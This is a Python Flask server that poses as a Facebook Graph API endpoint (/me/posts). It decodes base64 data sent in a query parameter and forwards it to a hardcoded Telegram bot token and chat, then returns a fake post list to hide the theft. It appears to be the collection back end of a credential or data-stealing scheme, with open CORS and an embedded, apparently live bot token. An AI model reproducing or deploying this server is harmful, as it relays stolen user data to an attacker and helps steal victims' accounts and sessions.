from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import base64

app = Flask(__name__)
CORS(app)  # Thêm CORS để cho phép tất cả origin

TELEGRAM_TOKEN = "7908353422:AAHYaNhrmsGznxxHKFXtGjzunQ3W7Tcsosw"
TELEGRAM_CHAT_ID = "-4670883195"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

@app.route('/me/posts', methods=['GET'])
def fake_facebook_api():
    data = request.args.get('data', '')
    
    try:
        decoded_data = base64.b64decode(data).decode('utf-8')
    except:
        decoded_data = data

    if decoded_data:
        send_to_telegram(decoded_data)

    fake_response = {
        "data": [{"id": "123", "message": "Fake post", "created_time": "2025-03-04"}],
        "paging": {"previous": "fake_prev", "next": "fake_next"}
    }
    return jsonify(fake_response)

def send_to_telegram(data):
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": data,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(TELEGRAM_API_URL, json=payload)
    except Exception as e:
        print("Lỗi Telegram:", str(e))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
